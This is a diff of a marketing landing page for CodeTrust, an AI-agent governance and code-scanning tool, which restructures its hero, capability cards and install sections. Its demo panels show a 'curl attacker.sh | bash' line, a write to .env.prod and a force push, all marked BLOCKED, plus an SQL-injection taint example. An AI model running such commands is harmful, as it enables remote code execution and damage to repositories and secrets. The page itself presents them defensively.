@@ -289,15 +289,15 @@
 
     <!-- ==================== SCREEN 1: HERO ==================== -->
     <section class="hero" id="hero">
-        <p class="hero-welcome">Code<span class="hw-trust">Trust</span> — <span class="hw-gov">AI Governance</span> Enforcement Platform</p>
-        <p class="hero-intro">3,006 rules. Taint analysis. Live registry verification. Pre-execution command interception. One platform that governs everything your AI agent touches.</p>
-        <h1 class="hero-headline">AI agents run your codebase.<br>Nobody governs them.<br><span class="hero-hl-green">Until now.</span></h1>
+        <p class="hero-welcome">Code<span class="hw-trust">Trust</span> &mdash; <span class="hw-gov">AI Governance</span> Enforcement Platform</p>
+        <h1 class="hero-headline">Your AI agent just ran <span class="hero-hl-blue">git push --force</span>.<br>Nobody stopped it.<br><span class="hero-hl-green">Until now.</span></h1>
+        <p class="hero-intro">7 enforcement layers. 3,006 rules. Real-time interception.<br><span class="mono" style="color:var(--green)">pip install codetrust && codetrust init</span> &mdash; governance active in 30 seconds.</p>
         <div class="hero-terminal" id="hero-terminal">
             <div class="hero-terminal-bar">
                 <div class="hero-terminal-dot" style="background:#ff5f57"></div>
                 <div class="hero-terminal-dot" style="background:#febc2e"></div>
                 <div class="hero-terminal-dot" style="background:#28c840"></div>
-                <span class="hero-terminal-title">terminal</span>
+                <span class="hero-terminal-title">terminal &mdash; codetrust enforcement</span>
             </div>
             <div class="hero-terminal-body">
                 <div id="typewriter-output"></div>
@@ -308,17 +308,269 @@
         <div class="hero-below" id="hero-below">
             <div class="hero-actions">
                 <a href="https://app.codetrust.ai" class="btn btn-primary">Get Started Free</a>
-                <a href="#capabilities" class="btn btn-ghost">See what we catch &rarr;</a>
+                <a href="#layers" class="btn btn-ghost">See what codetrust init installs &rarr;</a>
             </div>
-            <p class="hero-meta">v4.0.2 &middot; 3,006 rules &middot; 2,509 tests &middot; Free</p>
+            <p class="hero-meta">v4.0.2 &middot; 3,006 rules &middot; 2,924 suggestions &middot; 7 enforcement layers &middot; Free</p>
         </div>
     </section>
 
-    <!-- ==================== SCREEN 3: THREE CAPABILITIES ==================== -->
+    <!-- ==================== SCREEN 2: WHAT codetrust init INSTALLS ==================== -->
+    <section class="container" id="layers">
+        <div class="reveal">
+            <h2>What happens when you run <span class="mono" style="color:var(--green)">codetrust init</span></h2>
+            <p class="section-sub">One command installs 7 enforcement layers. Every layer is verified with <span class="mono" style="color:var(--green)">codetrust doctor</span>.</p>
+        </div>
+
+        <div class="init-steps reveal">
+            <div class="init-step" data-step="1">
+                <div class="init-step-icon init-step-done">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <div class="init-step-content">
+                    <div class="init-step-label">PreToolUse Hooks</div>
+                    <div class="init-step-desc">Real-time command interception. Every terminal command your AI agent runs passes through CodeTrust first.</div>
+                </div>
+                <div class="init-step-badge init-badge-red">intercepts before execution</div>
+            </div>
+            <div class="init-step" data-step="2">
+                <div class="init-step-icon init-step-done">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <div class="init-step-content">
+                    <div class="init-step-label">MCP Server Configuration</div>
+                    <div class="init-step-desc">Claude Code, Cursor, and Claude Desktop configured automatically. Gateway + Guardian servers registered.</div>
+                </div>
+                <div class="init-step-badge init-badge-indigo">auto-configured</div>
+            </div>
+            <div class="init-step" data-step="3">
+                <div class="init-step-icon init-step-done">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <div class="init-step-content">
+                    <div class="init-step-label">Pre-commit Hook</div>
+                    <div class="init-step-desc">Commit gate. No code passes without a clean scan. Blocks BLOCK-severity findings at commit time.</div>
+                </div>
+                <div class="init-step-badge init-badge-amber">commit gate</div>
+            </div>
+            <div class="init-step" data-step="4">
+                <div class="init-step-icon init-step-done">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <div class="init-step-content">
+                    <div class="init-step-label">GitHub Action</div>
+                    <div class="init-step-desc">PR gate. Runs full scan on every pull request. Fails the check if critical findings exist.</div>
+                </div>
+                <div class="init-step-badge init-badge-indigo">PR gate</div>
+            </div>
+            <div class="init-step" data-step="5">
+                <div class="init-step-icon init-step-done">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <div class="init-step-content">
+                    <div class="init-step-label">CLAUDE.md Agent Instructions</div>
+                    <div class="init-step-desc">Injects governance rules into the AI agent's context. The agent is instructed to call CodeTrust before every action.</div>
+                </div>
+                <div class="init-step-badge init-badge-cyan">agent-aware</div>
+            </div>
+            <div class="init-step" data-step="6">
+                <div class="init-step-icon init-step-done">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <div class="init-step-content">
+                    <div class="init-step-label">Governance Config</div>
+                    <div class="init-step-desc"><span class="mono">.codetrust.toml</span> with enforce mode, audit logging, and all 82 gateway rules active.</div>
+                </div>
+                <div class="init-step-badge init-badge-amber">enforce mode</div>
+            </div>
+            <div class="init-step" data-step="7">
+                <div class="init-step-icon init-step-done">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <div class="init-step-content">
+                    <div class="init-step-label">codetrust doctor</div>
+                    <div class="init-step-desc">Verification. All 7 layers checked. Green means enforced. Red means exposed.</div>
+                </div>
+                <div class="init-step-badge init-badge-green">7/7 verified</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ==================== SCREEN 3: FIVE CAPABILITIES ==================== -->
+    <section class="container" id="capabilities">
+        <div class="reveal">
+            <h2>Five layers of control nobody else has</h2>
+            <p class="section-sub">SonarQube checks quality. Snyk checks dependencies. Semgrep checks patterns.<br>Nobody checks what the AI agent itself is doing.<br><span class="hl-green">That requires governance, not just scanning.</span></p>
+        </div>
+
+        <div class="five-cards">
+            <!-- CARD 1: Hallucination Detection -->
+            <div class="demo-card reveal">
+                <div class="demo-card-header">
+                    <h3>Catches code that doesn't exist</h3>
+                    <span class="card-badge card-badge-red">Hallucination Detection</span>
+                </div>
+                <div class="demo-card-body">
+                    <div class="mini-terminal">
+                        <span class="t-dim">$</span> <span class="t-white">from</span> openai_helpers <span class="t-white">import</span> retry_with_backoff<br>
+                        <br>
+                        <span class="t-red">BLOCK</span> <span class="t-dim">openai_helpers not found on PyPI</span><br>
+                        <span class="t-dim">Did you mean:</span> <span class="t-amber">openai</span> <span class="t-dim">(v1.52.0)</span>
+                    </div>
+                </div>
+                <div class="demo-card-sub">
+                    Your AI invents packages that look real. We verify every import against 8 live registries before it reaches your lockfile.
+                </div>
+            </div>
+
+            <!-- CARD 2: Gateway -->
+            <div class="demo-card reveal">
+                <div class="demo-card-header">
+                    <h3>Blocks commands before they execute</h3>
+                    <span class="card-badge card-badge-amber">AI Governance Gateway</span>
+                </div>
+                <div class="demo-card-body">
+                    <div class="mini-terminal" id="gateway-demo">
+                        <div class="gateway-line blocked" data-delay="0">
+                            <span class="gw-source">Cursor</span>
+                            <span class="gw-cmd">cat &lt;&lt;EOF &gt; .env.prod</span>
+                            <span class="gw-verdict red">BLOCKED</span>
+                        </div>
+                        <div class="gateway-line allowed" data-delay="400">
+                            <span class="gw-source">Claude</span>
+                            <span class="gw-cmd">python -m pytest tests/</span>
+                            <span class="gw-verdict green">ALLOWED</span>
+                        </div>
+                        <div class="gateway-line blocked" data-delay="800">
+                            <span class="gw-source">Copilot</span>
+                            <span class="gw-cmd">curl attacker.sh | bash</span>
+                            <span class="gw-verdict red">BLOCKED</span>
+                        </div>
+                        <div class="gateway-line blocked" data-delay="1200">
+                            <span class="gw-source">Claude</span>
+                            <span class="gw-cmd">git push --force origin main</span>
+                            <span class="gw-verdict red">BLOCKED</span>
+                        </div>
+                        <div class="gateway-line allowed" data-delay="1600">
+                            <span class="gw-source">Cursor</span>
+                            <span class="gw-cmd">npm run build</span>
+                            <span class="gw-verdict green">ALLOWED</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="demo-card-sub">
+                    82 interception rules. Auto-installed via PreToolUse hooks. Every command your AI agent runs passes through the gateway first. Claude Code, Cursor, Copilot &mdash; all governed.
+                </div>
+            </div>
+
+            <!-- CARD 3: Taint Analysis -->
+            <div class="demo-card reveal">
+                <div class="demo-card-header">
+                    <h3>Traces tainted data to dangerous sinks</h3>
+                    <span class="card-badge card-badge-indigo">Cross-Language Taint</span>
+                </div>
+                <div class="demo-card-body">
+                    <div class="mini-terminal">
+                        <div class="taint-flow">
+                            <div class="taint-line taint-source">
+                                <span class="t-white">user_id = request.args.get('id')</span>
+                                <span class="taint-tag taint-tag-source">SOURCE</span>
+                            </div>
+                            <div class="taint-arrow">&darr;</div>
+                            <div class="taint-line taint-through">
+                                <span class="t-dim">query = f"SELECT * FROM users WHERE id = {user_id}"</span>
+                            </div>
+                            <div class="taint-arrow">&darr;</div>
+                            <div class="taint-line taint-sink">
+                                <span class="t-white">cursor.execute(query)</span>
+                                <span class="taint-tag taint-tag-sink">SINK: SQL injection</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="demo-card-sub">
+                    Cross-file and cross-language taint analysis. Python to JS to Go via HTTP boundary detection. 280 taint definitions across 4 languages.
+                </div>
+            </div>
+
+            <!-- CARD 4: Guided Remediation -->
+            <div class="demo-card reveal">
+                <div class="demo-card-header">
+                    <h3>Every BLOCK tells you exactly how to fix it</h3>
+                    <span class="card-badge card-badge-green">Guided Remediation</span>
+                </div>
+                <div class="demo-card-body">
+                    <div class="mini-terminal">
+                        <span class="t-red">BLOCK</span> <span class="t-dim">bare_except_handler</span><br>
+                        <span class="t-dim">Line 42:</span> <span class="t-white">except:</span><br>
+                        <br>
+                        <span class="t-green">FIX:</span> <span class="t-white">except Exception as exc:</span><br>
+                        <span class="t-dim">Root cause: bare except catches SystemExit</span><br>
+                        <span class="t-dim">and KeyboardInterrupt, hiding real errors.</span>
+                    </div>
+                </div>
+                <div class="demo-card-sub">
+                    Not just "unsafe code detected" &mdash; exact code, exact fix, root cause explanation. 2,924 individual suggestions across all rule categories.
+                </div>
+            </div>
+
+            <!-- CARD 5: AI Observability -->
+            <div class="demo-card reveal">
+                <div class="demo-card-header">
+                    <h3>Which AI model wrote which line</h3>
+                    <span class="card-badge card-badge-cyan">AI Observability</span>
+                </div>
+                <div class="demo-card-body">
+                    <div class="mini-terminal">
+                        <span class="t-dim">Model attribution:</span><br>
+                        <span class="t-cyan">claude-3.5-sonnet</span> <span class="t-dim">42 lines</span><br>
+                        <span class="t-amber">gpt-4o</span> <span class="t-dim">18 lines</span><br>
+                        <span class="t-white">human</span> <span class="t-dim">156 lines</span><br>
+                        <br>
+                        <span class="t-red">WARN</span> <span class="t-dim">Shadow AI detected: ai_edit marker</span><br>
+                        <span class="t-dim">from unregistered model in auth.py</span>
+                    </div>
+                </div>
+                <div class="demo-card-sub">
+                    Shadow AI detection. Developer risk scoring. 26 models discovered live. Know exactly which AI touched your codebase and what it changed.
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ==================== SCREEN 4: DOCTOR OUTPUT ==================== -->
+    <section class="container" id="doctor">
+        <div class="reveal">
+            <h2><span class="mono" style="color:var(--green)">codetrust doctor</span> &mdash; proof it works</h2>
+            <p class="section-sub">Run it after init. Every layer verified. Green means enforced.</p>
+        </div>
+
+        <div class="doctor-terminal reveal">
+            <div class="hero-terminal-bar">
+                <div class="hero-terminal-dot" style="background:#ff5f57"></div>
+                <div class="hero-terminal-dot" style="background:#febc2e"></div>
+                <div class="hero-terminal-dot" style="background:#28c840"></div>
+                <span class="hero-terminal-title">terminal &mdash; codetrust doctor</span>
+            </div>
+            <div class="doctor-terminal-body">
+                <div class="doctor-line"><span class="doctor-check t-green">&#10003;</span> <span class="t-white">PreToolUse hooks</span> <span class="t-dim">&mdash; installed in ~/.claude/settings.json</span></div>
+                <div class="doctor-line"><span class="doctor-check t-green">&#10003;</span> <span class="t-white">MCP Gateway server</span> <span class="t-dim">&mdash; registered, 82 interception rules active</span></div>
+                <div class="doctor-line"><span class="doctor-check t-green">&#10003;</span> <span class="t-white">MCP Guardian server</span> <span class="t-dim">&mdash; registered, 2,924 scan rules active</span></div>
+                <div class="doctor-line"><span class="doctor-check t-green">&#10003;</span> <span class="t-white">Pre-commit hook</span> <span class="t-dim">&mdash; .git/hooks/pre-commit installed</span></div>
+                <div class="doctor-line"><span class="doctor-check t-green">&#10003;</span> <span class="t-white">GitHub Action</span> <span class="t-dim">&mdash; .github/workflows/codetrust.yml present</span></div>
+                <div class="doctor-line"><span class="doctor-check t-green">&#10003;</span> <span class="t-white">CLAUDE.md governance</span> <span class="t-dim">&mdash; agent instructions injected</span></div>
+                <div class="doctor-line"><span class="doctor-check t-green">&#10003;</span> <span class="t-white">Governance config</span> <span class="t-dim">&mdash; .codetrust.toml enforce mode</span></div>
+                <div class="doctor-summary">
+                    <span class="t-green">7/7 layers active</span> <span class="t-dim">&mdash;</span> <span class="t-white">governance fully enforced</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ==================== SCREEN 5: LIVE TELEMETRY ==================== -->
     <section class="container" id="telemetry">
         <div class="reveal">
-            <h2><span class="live-dot"></span> This is real. Right now.</h2>
-            <p class="section-sub">Every scan, every block, every verification &mdash; streamed live from production.</p>
+            <h2><span class="live-dot"></span> Live from production. Not a demo.</h2>
+            <p class="section-sub">Every scan, every block, every verification &mdash; streamed live from production infrastructure. These numbers update in real time.</p>
         </div>
 
         <div class="dash-grid reveal">
@@ -364,107 +616,11 @@
         <p class="telemetry-note reveal" id="live-updated-at">live</p>
     </section>
 
-    <!-- ==================== SCREEN 2: LIVE TELEMETRY ==================== -->
-    <section class="container" id="capabilities">
-        <div class="reveal">
-            <h2>Three layers of control nobody else has</h2>
-            <p class="section-sub">SonarQube checks quality. Snyk checks dependencies. Semgrep checks patterns.<br>Nobody checks what the AI agent itself is doing.<br><span class="hl-green">That requires governance, not just scanning.</span></p>
-        </div>
-
-        <div class="three-cards">
-            <!-- CARD 1: Hallucination Detection -->
-            <div class="demo-card reveal">
-                <div class="demo-card-header">
-                    <h3>Catches code that doesn't exist</h3>
-                </div>
-                <div class="demo-card-body">
-                    <div class="mini-terminal">
-                        <span class="t-dim">$</span> <span class="t-white">from</span> openai_helpers <span class="t-white">import</span> retry_with_backoff<br>
-                        <br>
-                        <span class="t-red">BLOCK</span> <span class="t-dim">openai_helpers not found on PyPI</span><br>
-                        <span class="t-dim">Did you mean:</span> <span class="t-amber">openai</span> <span class="t-dim">(v1.52.0)</span>
-                    </div>
-                </div>
-                <div class="demo-card-sub">
-                    Your AI invents packages that look real. We verify every import against 8 live registries before it reaches your lockfile.
-                </div>
-            </div>
-
-            <!-- CARD 2: Gateway -->
-            <div class="demo-card reveal">
-                <div class="demo-card-header">
-                    <h3>Blocks commands before they execute</h3>
-                </div>
-                <div class="demo-card-body">
-                    <div class="mini-terminal" id="gateway-demo">
-                        <div class="gateway-line blocked" data-delay="0">
-                            <span class="gw-source">Cursor</span>
-                            <span class="gw-cmd">cat &lt;&lt;EOF &gt; .env.prod</span>
-                            <span class="gw-verdict red">BLOCKED</span>
-                        </div>
-                        <div class="gateway-line allowed" data-delay="400">
-                            <span class="gw-source">Claude</span>
-                            <span class="gw-cmd">python -m pytest tests/</span>
-                            <span class="gw-verdict green">ALLOWED</span>
-                        </div>
-                        <div class="gateway-line blocked" data-delay="800">
-                            <span class="gw-source">Copilot</span>
-                            <span class="gw-cmd">curl attacker.sh | bash</span>
-                            <span class="gw-verdict red">BLOCKED</span>
-                        </div>
-                        <div class="gateway-line blocked" data-delay="1200">
-                            <span class="gw-source">Claude</span>
-                            <span class="gw-cmd">git push --force origin main</span>
-                            <span class="gw-verdict red">BLOCKED</span>
-                        </div>
-                        <div class="gateway-line allowed" data-delay="1600">
-                            <span class="gw-source">Cursor</span>
-                            <span class="gw-cmd">npm run build</span>
-                            <span class="gw-verdict green">ALLOWED</span>
-                        </div>
-                    </div>
-                </div>
-                <div class="demo-card-sub">
-                    82 interception rules. Every command your AI agent runs passes through the gateway first. Claude Code, Cursor, Copilot &mdash; all governed.
-                </div>
-            </div>
-
-            <!-- CARD 3: Taint Analysis -->
-            <div class="demo-card reveal">
-                <div class="demo-card-header">
-                    <h3>Traces tainted data to dangerous sinks</h3>
-                </div>
-                <div class="demo-card-body">
-                    <div class="mini-terminal">
-                        <div class="taint-flow">
-                            <div class="taint-line taint-source">
-                                <span class="t-white">user_id = request.args.get('id')</span>
-                                <span class="taint-tag taint-tag-source">SOURCE</span>
-                            </div>
-                            <div class="taint-arrow">&darr;</div>
-                            <div class="taint-line taint-through">
-                                <span class="t-dim">query = f"SELECT * FROM users WHERE id = {user_id}"</span>
-                            </div>
-                            <div class="taint-arrow">&darr;</div>
-                            <div class="taint-line taint-sink">
-                                <span class="t-white">cursor.execute(query)</span>
-                                <span class="taint-tag taint-tag-sink">SINK: SQL injection</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="demo-card-sub">
-                    Your AI writes <code>request.args</code> into a SQL query. We trace the data flow and block it. The code never reaches review.
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ==================== SCREEN 4: COMPETITIVE ==================== -->
+    <!-- ==================== SCREEN 6: COMPETITIVE ==================== -->
     <section class="container" id="compare">
         <div class="reveal">
             <h2>What they miss. What we govern.</h2>
-            <p class="section-sub">SAST tools were built for human-written code. AI agents don't just write code —<br>they execute commands, install packages, and modify files.<br><span class="hl-green">That requires governance, not just scanning.</span></p>
+            <p class="section-sub">SAST tools were built for human-written code. AI agents don't just write code &mdash;<br>they execute commands, install packages, and modify files.<br><span class="hl-green">That requires governance, not just scanning.</span></p>
         </div>
 
         <div class="compare-split reveal">
@@ -484,6 +640,8 @@
                 <div class="compare-item"><span class="compare-item-dot bright"></span> Ghost Docker images &amp; tags</div>
                 <div class="compare-item"><span class="compare-item-dot bright"></span> Pre-execution command interception</div>
                 <div class="compare-item"><span class="compare-item-dot bright"></span> AI governance gateway enforcement</div>
+                <div class="compare-item"><span class="compare-item-dot bright"></span> Shadow AI detection &amp; model attribution</div>
+                <div class="compare-item"><span class="compare-item-dot bright"></span> Guided remediation with root cause</div>
             </div>
         </div>
 
@@ -507,6 +665,13 @@
                         <td><span class="dash-mark">&mdash;</span></td>
                     </tr>
                     <tr>
+                        <td>Auto-installed Enforcement Hooks</td>
+                        <td class="ct-col"><span class="check">Yes</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                    </tr>
+                    <tr>
                         <td>Hallucination Detection</td>
                         <td class="ct-col"><span class="check">8 registries</span></td>
                         <td><span class="dash-mark">&mdash;</span></td>
@@ -514,15 +679,29 @@
                         <td><span class="dash-mark">&mdash;</span></td>
                     </tr>
                     <tr>
+                        <td>Guided Remediation</td>
+                        <td class="ct-col"><span class="check">2,924 suggestions</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                    </tr>
+                    <tr>
+                        <td>AI Observability</td>
+                        <td class="ct-col"><span class="check">26 models</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                        <td><span class="dash-mark">&mdash;</span></td>
+                    </tr>
+                    <tr>
                         <td>Taint Analysis</td>
-                        <td class="ct-col"><span class="check">Yes</span></td>
+                        <td class="ct-col"><span class="check">Cross-language</span></td>
                         <td><span class="check">Yes</span></td>
                         <td><span class="check">Yes</span></td>
                         <td><span class="check">Yes</span></td>
                     </tr>
                     <tr>
                         <td>SAST Rules</td>
-                        <td class="ct-col">1,202</td>
+                        <td class="ct-col">2,924</td>
                         <td>5,000+</td>
                         <td>3,000+</td>
                         <td>SAST</td>
@@ -539,25 +718,56 @@
         </div>
     </section>
 
-    <!-- ==================== SCREEN 5: GET IN ==================== -->
+    <!-- ==================== SCREEN 7: INSTALL ==================== -->
     <section class="container" id="install">
         <div class="reveal">
-            <h2>Get started in 30 seconds</h2>
-            <p class="section-sub">Three ways in. All free. No credit card.</p>
+            <h2>Governance active in 30 seconds</h2>
+            <p class="section-sub">One command. Seven layers. Fully verified.</p>
         </div>
 
-        <div class="install-grid reveal">
-            <div class="install-card">
-                <h3>CLI</h3>
-                <code>pip install codetrust</code>
+        <div class="install-hero reveal">
+            <div class="install-hero-terminal">
+                <div class="hero-terminal-bar">
+                    <div class="hero-terminal-dot" style="background:#ff5f57"></div>
+                    <div class="hero-terminal-dot" style="background:#febc2e"></div>
+                    <div class="hero-terminal-dot" style="background:#28c840"></div>
+                    <span class="hero-terminal-title">terminal</span>
+                </div>
+                <div class="install-terminal-body">
+                    <div class="install-line"><span class="t-dim">$</span> <span class="t-green">pip install codetrust</span></div>
+                    <div class="install-line"><span class="t-dim">$</span> <span class="t-green">codetrust init</span></div>
+                    <div class="install-line"><span class="t-dim">&nbsp;&nbsp;Installing 7 enforcement layers...</span></div>
+                    <div class="install-line"><span class="t-green">&#10003;</span> <span class="t-dim">All layers installed</span></div>
+                    <div class="install-line"><span class="t-dim">$</span> <span class="t-green">codetrust doctor</span></div>
+                    <div class="install-line"><span class="t-green">&#10003;</span> <span class="t-white">7/7 layers active &mdash; governance fully enforced</span></div>
+                </div>
             </div>
-            <div class="install-card">
-                <h3>VS Code</h3>
+        </div>
+
+        <div class="install-surfaces reveal">
+            <div class="install-surface-card">
+                <div class="install-surface-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--indigo)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+                </div>
+                <h3>VS Code Extension</h3>
                 <code>ext install SaidBorna.codetrust</code>
+                <p class="install-surface-desc">Scan on save. Inline findings. One-click fix.</p>
             </div>
-            <div class="install-card">
+            <div class="install-surface-card">
+                <div class="install-surface-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--indigo)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+                </div>
                 <h3>GitHub Action</h3>
-                <code>pip install codetrust</code> in CI workflow
+                <code>pip install codetrust</code>
+                <p class="install-surface-desc">PR gate. Fails the check on BLOCK findings.</p>
+            </div>
+            <div class="install-surface-card">
+                <div class="install-surface-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--indigo)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                </div>
+                <h3>Chrome Extension</h3>
+                <code>Chrome Web Store</code>
+                <p class="install-surface-desc">Scan code on GitHub, GitLab, Stack Overflow.</p>
             </div>
         </div>
 
@@ -581,7 +791,7 @@
         </div>
 
         <div class="bottom-cta reveal">
-            <h3>Your AI agents need a governance layer</h3>
+            <h3>Your AI agents need a governance layer. Install in 30 seconds.</h3>
             <div class="hero-actions">
                 <a href="https://app.codetrust.ai" class="btn btn-primary">Get Started Free</a>
                 <a href="https://marketplace.visualstudio.com/items?itemName=SaidBorna.codetrust" class="btn btn-ghost">Install VS Code Extension</a>
@@ -652,27 +862,26 @@
         });
 
         // ============================================================
-        // TYPEWRITER — Hero "Oh Shit Moment"
+        // TYPEWRITER — Hero enforcement story
         // ============================================================
         (function() {
             var output = document.getElementById('typewriter-output');
             var cursor = document.getElementById('cursor');
             var lines = [
-                { text: '$ pip install anthropic-agent-toolkit\n', cls: 't-green', delay: 40 },
+                { text: '$ claude "deploy the hotfix to production"\n', cls: 't-green', delay: 35 },
                 { pause: 600 },
-                { text: 'Collecting anthropic-agent-toolkit...\n', cls: 't-dim', delay: 25 },
-                { text: 'Installing anthropic-agent-toolkit...\n', cls: 't-dim', delay: 25 },
-                { pause: 1200 },
-                { clear: true },
-                { text: '$ pip install anthropic-agent-toolkit\n', cls: 't-dim', delay: 0 },
+                { text: '\n', cls: '', delay: 0 },
+                { text: 'Agent: running git push --force origin main\n', cls: 't-dim', delay: 25 },
                 { pause: 400 },
                 { text: '\n', cls: '', delay: 0 },
-                { text: 'WARNING  This package was never published to PyPI.\n', cls: 't-red', delay: 30 },
-                { text: '         It was hallucinated by your AI assistant.\n', cls: 't-red', delay: 30 },
-                { text: '         A typosquatter registered it 12 minutes ago.\n         It contains a reverse shell in setup.py.\n', cls: 't-red', delay: 30 },
-                { pause: 1400 },
+                { text: 'BLOCKED', cls: 't-red', delay: 0 },
+                { text: '  git push is prohibited by governance policy\n', cls: 't-red', delay: 30 },
+                { text: '  Rule: gateway_no_push (PreToolUse hook)\n', cls: 't-dim', delay: 25 },
+                { text: '  Suggestion: create a PR instead of force pushing\n', cls: 't-amber', delay: 25 },
+                { pause: 1200 },
                 { text: '\n', cls: '', delay: 0 },
-                { text: 'CodeTrust caught this before it shipped.\n', cls: 't-green', delay: 35 },
+                { text: 'CodeTrust intercepted this before it executed.\n', cls: 't-green', delay: 35 },
+                { text: '7 enforcement layers. Zero damage.\n', cls: 't-green', delay: 35 },
             ];
 
             var lineIndex = 0;
@@ -753,6 +962,28 @@
         var gatewayDemo = document.getElementById('gateway-demo');
         if (gatewayDemo) {
             gatewayObserver.observe(gatewayDemo);
+        }
+
+        // ============================================================
+        // INIT STEPS ANIMATION — staggered checkmark reveal
+        // ============================================================
+        var initStepsObserver = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+                if (entry.isIntersecting) {
+                    var steps = entry.target.querySelectorAll('.init-step');
+                    steps.forEach(function(step, i) {
+                        setTimeout(function() {
+                            step.classList.add('init-step-visible');
+                        }, i * 200);
+                    });
+                    initStepsObserver.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.2 });
+
+        var initSteps = document.querySelector('.init-steps');
+        if (initSteps) {
+            initStepsObserver.observe(initSteps);
         }
 
         // ============================================================
@@ -892,6 +1123,8 @@
                 el.dataset.count = newVal;
                 if (newVal !== oldVal) {
                     animateValue(el, oldVal, newVal, dur);
+                    el.classList.add('dash-pulse');
+                    setTimeout(function() { el.classList.remove('dash-pulse'); }, 1200);
                 }
             });
             firstLoad = false;
